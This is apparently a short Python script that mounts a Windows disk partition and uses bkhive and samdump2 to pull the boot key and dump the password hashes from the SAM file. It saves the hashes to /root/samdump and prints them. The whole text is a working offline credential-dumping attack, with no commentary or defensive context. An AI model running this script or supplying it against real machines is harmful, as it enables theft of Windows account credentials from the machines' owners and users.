import os,sys
from subprocess import call
mountdir="/mnt/sda1"
device="/dev/sda1"
samfile="SAM"
system="system"
savelocation=r"/root/bootkey"
configdir=mountdir+r"/WINDOWS/system32/config"
savefile=r"/root/bootkey"
dumpfile="/root/samdump"
call(["mkdir","-p",mountdir])
call(["mount",device,mountdir])
call(["bkhive",configdir+"/"+system,savefile])
o=open(dumpfile, "w+")
call(["samdump2",configdir+"/"+samfile,savefile],stdout=o)
o.close()
call(["samdump2",configdir+"/"+samfile,savefile])
